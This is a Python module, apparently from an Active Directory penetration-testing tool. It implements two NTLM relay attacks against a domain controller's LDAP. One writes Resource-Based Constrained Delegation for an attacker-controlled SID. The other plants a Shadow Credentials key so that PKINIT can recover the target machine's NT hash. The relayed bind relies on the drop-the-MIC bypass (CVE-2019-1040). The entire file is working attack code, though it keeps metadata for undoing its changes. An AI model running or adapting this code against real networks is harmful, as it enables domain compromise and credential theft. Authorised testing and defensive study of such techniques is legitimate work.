"""LDAP relay targets: write RBCD or Shadow Credentials via relayed NTLM.

Two sibling relay targets that both relay a captured NTLM authentication into
the DC's LDAP and perform a single attribute ``modify()`` on a target computer:

* :class:`LDAPRBCDRelayTarget` writes
  ``msDS-AllowedToActOnBehalfOfOtherIdentity`` (Resource-Based Constrained
  Delegation), granting an already-controlled delegate.
* :class:`LDAPShadowCredsRelayTarget` appends an entry to
  ``msDS-KeyCredentialLink`` (Shadow Credentials), so PKINIT with the minted
  key recovers the target's NT hash.

Both are the canonical relay SELF flow: a computer can write its own
``msDS-AllowedToActOnBehalfOfOtherIdentity`` / ``msDS-KeyCredentialLink``, so
when ``target_computer`` is omitted the target is derived from the relayed
principal's machine account (e.g. ``WEB01$``).

The bind is established by the shared :func:`establish_relay_ldap_session`
helper (drop-the-MIC / CVE-2019-1040). The RBCD security-descriptor
construction mirrors the credentialed native path ``rbcd_write_native``
(``delegation_native.py:690-720``) exactly — same ACE mask ``0xF01FF``, same
ACL revision 4, same SD control flags and Owner. The Shadow-Credentials
KeyCredential construction mirrors ``add_shadow_credentials_native``
(``adcs/shadow_credentials.py:73-76``) exactly — same
``KeyCredential.generate_self_signed_certificate`` +
``toDNWithBinary2String`` + append-to-existing semantics; the PKINIT->NT-hash
tail is reused from the same module (``shadow_credentials.py:86-106``).

Both targets are drop-in compatible with the ``RelayTarget`` protocol expected
by ``RelayEngine``.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from adscan_core import telemetry
from adscan_internal.rich_output import mark_sensitive, print_info_debug, print_success
from adscan_internal.services.relay.core import RelayAuthentication, RelayTargetResult
from adscan_internal.services.relay.display import print_relay_captured
from adscan_internal.services.relay.identity import extract_ntlm_identity
from adscan_internal.services.relay.ldap_relay_session import (
    establish_relay_ldap_session,
)
from adscan_core.rich_output import print_exception


@dataclass(frozen=True)
class LDAPRBCDRelayConfig:
    """Settings for the RBCD-write LDAP relay target.

    Args:
        dc_ip: IP address of the domain controller to relay to.
        domain: AD domain name (used for display and SICILY cred construction).
        ldap_port: LDAP port. 389 only — LDAPS requires channel binding.
        target_computer: sAMAccountName (without ``$``) of the computer to write
            RBCD ON. If ``None``, SELF — derived from the relayed principal's
            NTLM identity (the machine account, e.g. ``WEB01$``).
        actor_sid: SID of the already-controlled delegate principal (a machine
            account) that will be granted delegation onto ``target_computer``.
        output_dir: Reserved for future artefact output; currently unused.
    """

    dc_ip: str
    domain: str
    actor_sid: str
    ldap_port: int = 389
    target_computer: str | None = None
    output_dir: str | None = None


class LDAPRBCDRelayTarget:
    """Relay target: relayed NTLM LDAP bind → write RBCD on a target computer.

    Compatible with the ``RelayTarget`` protocol expected by ``RelayEngine``.
    """

    name = "ldap-rbcd"
    technique = "LDAP-RBCD"

    def __init__(self, config: LDAPRBCDRelayConfig) -> None:
        self.config = config

    async def run(self, authentication: RelayAuthentication) -> RelayTargetResult:
        # The relayed identity is NOT reliably available yet: only the NEGOTIATE
        # has been captured at this point. The AUTHENTICATE (which carries the
        # machine-account name) is completed only when the relayed bind is DRIVEN
        # inside ``_relay_write_rbcd``. So a SELF target MUST be derived AFTER the
        # bind, never here. Deriving it here previously bailed before the bind
        # could run, which also starved the SMB relay server's challenge wait
        # (the server timed out waiting for a CHALLENGE the bind never produced).
        rdomain, rusername = extract_ntlm_identity(authentication.gssapi)
        principal = (
            f"{rdomain}\\{rusername}" if rdomain and rusername else (rusername or "?")
        )
        print_relay_captured(principal, self.config.dc_ip, self.technique)

        try:
            outcome = await _relay_write_rbcd(
                gssapi=authentication.gssapi,
                dc_ip=self.config.dc_ip,
                domain=self.config.domain,
                ldap_port=self.config.ldap_port,
                target_computer=self.config.target_computer,  # None ⇒ SELF (derived post-bind)
                actor_sid=self.config.actor_sid,
            )
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            return RelayTargetResult(
                target_name=self.name,
                success=False,
                technique=self.technique,
                principal=principal,
                error=str(exc),
            )

        target_dn = outcome["target_dn"]
        target_computer = outcome["target_computer"]
        already_set = outcome["already_set"]
        prior_sd_hex = outcome["prior_sd_hex"]
        # The relayed identity is known once the bind completed; refresh the
        # placeholder principal if it was unknown before the bind.
        if principal == "?" and target_computer:
            principal = f"{target_computer}$"

        if already_set:
            print_info_debug(
                f"[ldap-rbcd] delegation already present for actor SID on "
                f"{mark_sensitive(target_computer, 'user')} — no change"
            )
        else:
            print_success(
                f"[ldap-rbcd] Wrote RBCD on {mark_sensitive(target_computer, 'user')} "
                f"at {mark_sensitive(self.config.dc_ip, 'hostname')} "
                f"as {mark_sensitive(principal, 'user')}"
            )

        return RelayTargetResult(
            target_name=self.name,
            success=True,
            technique=self.technique,
            principal=principal,
            metadata={
                "target_dn": target_dn,
                "target_computer": target_computer,
                "actor_sid": self.config.actor_sid,
                "dc_ip": self.config.dc_ip,
                "relayed_from": principal,
                "rbcd_set": True,
                "already_set": already_set,
                # Cleanup material for a later revert step (Stage 1b): the prior
                # raw SD bytes as hex, or "empty" if the attribute was unset.
                "prior_sd_hex": prior_sd_hex,
                "prior_attribute_empty": prior_sd_hex == "empty",
            },
        )


async def _relay_write_rbcd(
    *,
    gssapi: Any,
    dc_ip: str,
    domain: str,
    ldap_port: int,
    target_computer: str | None,
    actor_sid: str,
) -> dict[str, Any]:
    """Relay-bind to DC LDAP and write RBCD on ``target_computer``.

    Mirrors the credentialed ``rbcd_write_native`` SD construction exactly
    (``delegation_native.py:690-720``) but binds via the relay session and is
    given the actor SID directly (the relay flow controls the delegate).

    Returns a dict with ``target_dn``, ``already_set`` and ``prior_sd_hex``
    (hex of the prior raw SD bytes, or ``"empty"`` when the attribute was unset)
    so a later cleanup step can restore the attribute exactly.

    Raises on any failure so the caller can wrap it in a ``RelayTargetResult``.
    """
    # Shared RBCD SD construction (single source — see delegation_native).
    from adscan_internal.services.exploitation.delegation_native import (  # noqa: PLC0415
        build_rbcd_security_descriptor,
        rbcd_actor_already_delegated,
    )

    client, raw_conn, base_dn = await establish_relay_ldap_session(
        gssapi=gssapi,
        dc_ip=dc_ip,
        domain=domain,
        ldap_port=ldap_port,
    )

    try:
        if not target_computer:
            # The bind above drove the full NEGOTIATE→CHALLENGE→AUTHENTICATE
            # exchange, so the relayed identity is now populated. A SELF target is
            # the relayed machine account itself (a computer can write its own RBCD
            # / KeyCredentialLink).
            _rdom, _ruser = extract_ntlm_identity(gssapi)
            target_computer = (_ruser or "").rstrip("$")
            if not target_computer:
                raise RuntimeError(
                    "Could not derive SELF target computer from the relayed NTLM "
                    "identity after the bind completed"
                )
        target_sam = target_computer.rstrip("$") + "$"

        # --- Resolve target DN and existing SD (mirror rbcd_write_native) ---
        target_dn: str | None = None
        existing_sd_bytes: bytes | None = None

        async for entry, err in client.pagedsearch(
            f"(sAMAccountName={target_sam})",
            [
                "msDS-AllowedToActOnBehalfOfOtherIdentity",
                "objectSid",
                "distinguishedName",
            ],
            tree=base_dn,
        ):
            if err is not None:
                raise RuntimeError(f"LDAP search failed: {err}")
            if entry is None:
                continue
            attrs = entry.get("attributes", {})
            target_dn = attrs.get("distinguishedName")
            raw = attrs.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
            if raw:
                # badldap may return bytes, bytearray, or a parsed SD object.
                if isinstance(raw, bytes):
                    existing_sd_bytes = raw
                elif isinstance(raw, bytearray):
                    existing_sd_bytes = bytes(raw)
                elif hasattr(raw, "to_bytes"):
                    existing_sd_bytes = raw.to_bytes()
                else:
                    existing_sd_bytes = None  # unknown type; treat as unset

        if target_dn is None:
            raise RuntimeError(f"Target computer {target_sam!r} not found in directory")

        actor_sid_str = str(actor_sid)

        # --- Check if delegation is already set (shared single-source check) ---
        already_set = rbcd_actor_already_delegated(existing_sd_bytes, actor_sid_str)
        prior_sd_hex = existing_sd_bytes.hex() if existing_sd_bytes else "empty"

        if already_set:
            # Nothing to write — the actor already has delegation.
            return {
                "target_dn": target_dn,
                "target_computer": target_computer,
                "already_set": True,
                "prior_sd_hex": prior_sd_hex,
            }

        # --- Build new SD (shared single-source winacl construction) ---
        sd_bytes = build_rbcd_security_descriptor(
            actor_sid_str, existing_sd_bytes, carry_over_existing=bool(existing_sd_bytes)
        )
        changes = {
            "msDS-AllowedToActOnBehalfOfOtherIdentity": [("replace", sd_bytes)]
        }
        _, err = await raw_conn.modify(target_dn, changes)
        if err is not None:
            raise RuntimeError(f"LDAP RBCD modify failed: {err}")

        return {
            "target_dn": target_dn,
            "target_computer": target_computer,
            "already_set": False,
            "prior_sd_hex": prior_sd_hex,
        }
    finally:
        try:
            await raw_conn.disconnect()
        except Exception:
            pass


@dataclass(frozen=True)
class LDAPShadowCredsRelayConfig:
    """Settings for the Shadow-Credentials LDAP relay target.

    Args:
        dc_ip: IP address of the domain controller to relay to.
        domain: AD domain name (used for display and SICILY cred construction).
        ldap_port: LDAP port. 389 only — LDAPS requires channel binding.
        target_computer: sAMAccountName (without ``$``) of the computer to write
            ``msDS-KeyCredentialLink`` ON. If ``None``, SELF — derived from the
            relayed principal's NTLM identity (the machine account, e.g.
            ``WEB01$``), which can write its own KeyCredentialLink.
        output_dir: Reserved for future artefact output; currently unused.
    """

    dc_ip: str
    domain: str
    ldap_port: int = 389
    target_computer: str | None = None
    output_dir: str | None = None


class LDAPShadowCredsRelayTarget:
    """Relay target: relayed NTLM LDAP bind → append ``msDS-KeyCredentialLink``.

    Mints a self-signed KeyCredential exactly as the credentialed
    ``add_shadow_credentials_native`` does (``adcs/shadow_credentials.py:73-76``),
    APPENDS it to the target's existing ``msDS-KeyCredentialLink`` list, and
    captures the generated key material + the prior list in
    :attr:`RelayTargetResult.metadata` so the verb can (a) run the PKINIT→NT-hash
    tail and (b) revert by restoring the exact prior list.

    Compatible with the ``RelayTarget`` protocol expected by ``RelayEngine``.
    """

    name = "ldap-shadow-creds"
    technique = "LDAP-SHADOW-CREDS"

    def __init__(self, config: LDAPShadowCredsRelayConfig) -> None:
        self.config = config

    async def run(self, authentication: RelayAuthentication) -> RelayTargetResult:
        # SELF target is derived AFTER the relayed bind completes the AUTHENTICATE
        # (see the RBCD target for the rationale): deriving it here, pre-bind,
        # bailed before the bind could run and starved the SMB relay server's
        # challenge wait. _relay_write_shadow_creds drives the bind then resolves
        # SELF from the now-populated relayed identity.
        rdomain, rusername = extract_ntlm_identity(authentication.gssapi)
        principal = (
            f"{rdomain}\\{rusername}" if rdomain and rusername else (rusername or "?")
        )
        print_relay_captured(principal, self.config.dc_ip, self.technique)

        try:
            outcome = await _relay_write_shadow_creds(
                gssapi=authentication.gssapi,
                dc_ip=self.config.dc_ip,
                domain=self.config.domain,
                ldap_port=self.config.ldap_port,
                target_computer=self.config.target_computer,  # None ⇒ SELF (post-bind)
            )
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            return RelayTargetResult(
                target_name=self.name,
                success=False,
                technique=self.technique,
                principal=principal,
                error=str(exc),
            )

        target_computer = outcome["target_computer"]
        if principal == "?" and target_computer:
            principal = f"{target_computer}$"

        print_success(
            f"[ldap-shadow-creds] Wrote msDS-KeyCredentialLink on "
            f"{mark_sensitive(target_computer, 'user')} at "
            f"{mark_sensitive(self.config.dc_ip, 'hostname')} "
            f"as {mark_sensitive(principal, 'user')}"
        )

        return RelayTargetResult(
            target_name=self.name,
            success=True,
            technique=self.technique,
            principal=principal,
            metadata={
                "target_dn": outcome["target_dn"],
                "target_computer": target_computer,
                "target_sam": outcome["target_sam"],
                "dc_ip": self.config.dc_ip,
                "domain": self.config.domain,
                "relayed_from": principal,
                "shadow_creds_set": True,
                "device_id": outcome["device_id"],
                # Material the PKINIT->NT-hash tail needs (base64 PFX of the
                # minted key/cert). NOT a cleartext credential — a throwaway
                # self-signed cert we generated.
                "pfx_b64": outcome["pfx_b64"],
                # Cleanup material: restore EXACTLY the prior list so only the
                # entry we appended is removed.
                "prior_keycred_count": outcome["prior_keycred_count"],
                "prior_keycred_values": outcome["prior_keycred_values"],
                "prior_attribute_empty": outcome["prior_keycred_count"] == 0,
            },
        )


def _extract_device_id(key_credential: Any) -> str:
    """Best-effort UUID string of the KeyCredential device id (traceability only)."""
    raw_device = getattr(key_credential, "_KeyCredential__deviceId", None)
    if not isinstance(raw_device, tuple) or len(raw_device) != 2:
        return ""
    device_bytes = raw_device[1]
    if not device_bytes:
        return ""
    try:
        import uuid as _uuid  # noqa: PLC0415

        return str(_uuid.UUID(bytes=device_bytes))
    except Exception:  # noqa: BLE001 - traceability only
        return ""


async def _relay_write_shadow_creds(
    *,
    gssapi: Any,
    dc_ip: str,
    domain: str,
    ldap_port: int,
    target_computer: str | None,
) -> dict[str, Any]:
    """Relay-bind to DC LDAP and append ``msDS-KeyCredentialLink`` on the target.

    Mirrors the credentialed ``add_shadow_credentials_native`` KeyCredential
    construction exactly (``adcs/shadow_credentials.py:73-76``) but binds via the
    relay session. Reads the existing list, appends the new DN-Binary entry, and
    ``replace``s the whole list (RFC4511 — KeyCredentialLink is multi-valued).

    Returns a dict with ``target_dn``, ``target_sam``, ``device_id``, the
    base64-PFX of the minted key (``pfx_b64`` — for the PKINIT tail), and the
    prior list snapshot (``prior_keycred_values`` / ``prior_keycred_count``) so
    a later cleanup step can restore the attribute exactly.

    Raises on any failure so the caller can wrap it in a ``RelayTargetResult``.
    """
    import base64  # noqa: PLC0415

    from badldap.commons.keycredential import KeyCredential  # noqa: PLC0415

    client, raw_conn, base_dn = await establish_relay_ldap_session(
        gssapi=gssapi,
        dc_ip=dc_ip,
        domain=domain,
        ldap_port=ldap_port,
    )

    try:
        if not target_computer:
            # The bind above drove the full NEGOTIATE→CHALLENGE→AUTHENTICATE
            # exchange, so the relayed identity is now populated. A SELF target is
            # the relayed machine account itself (a computer can write its own RBCD
            # / KeyCredentialLink).
            _rdom, _ruser = extract_ntlm_identity(gssapi)
            target_computer = (_ruser or "").rstrip("$")
            if not target_computer:
                raise RuntimeError(
                    "Could not derive SELF target computer from the relayed NTLM "
                    "identity after the bind completed"
                )
        target_sam = target_computer.rstrip("$") + "$"

        # --- Resolve target DN + existing KeyCredentialLink (DN-Binary strings) ---
        target_dn: str | None = None
        existing_keys: list[str] = []

        async for entry, err in client.pagedsearch(
            f"(sAMAccountName={target_sam})",
            ["msDS-KeyCredentialLink", "distinguishedName"],
            tree=base_dn,
        ):
            if err is not None:
                raise RuntimeError(f"LDAP search failed: {err}")
            if entry is None:
                continue
            attrs = entry.get("attributes", {})
            target_dn = attrs.get("distinguishedName")
            raw = attrs.get("msDS-KeyCredentialLink")
            if raw:
                values = raw if isinstance(raw, list) else [raw]
                existing_keys = [str(v) for v in values if str(v).strip()]

        if target_dn is None:
            raise RuntimeError(f"Target computer {target_sam!r} not found in directory")

        # --- Mint the KeyCredential exactly as add_shadow_credentials_native does ---
        cert_subject = target_sam.strip().strip("$")[:64] or "adscan-shadow"
        key_credential = KeyCredential.generate_self_signed_certificate(cert_subject)
        device_id = _extract_device_id(key_credential)

        new_entry = key_credential.toDNWithBinary2String(target_dn)
        prior_values = list(existing_keys)
        updated = prior_values + [new_entry]

        # KeyCredentialLink is multi_str — pass the full string list and replace.
        _, err = await raw_conn.modify(
            target_dn,
            {"msDS-KeyCredentialLink": [("replace", updated)]},
        )
        if err is not None:
            raise RuntimeError(f"LDAP msDS-KeyCredentialLink modify failed: {err}")

        pfx_b64 = base64.b64encode(key_credential.to_pfx_data()).decode("utf-8")

        return {
            "target_dn": target_dn,
            "target_computer": target_computer,
            "target_sam": target_sam,
            "device_id": device_id,
            "pfx_b64": pfx_b64,
            "prior_keycred_values": prior_values,
            "prior_keycred_count": len(prior_values),
        }
    finally:
        try:
            await raw_conn.disconnect()
        except Exception:
            pass


__all__ = [
    "LDAPRBCDRelayConfig",
    "LDAPRBCDRelayTarget",
    "LDAPShadowCredsRelayConfig",
    "LDAPShadowCredsRelayTarget",
]
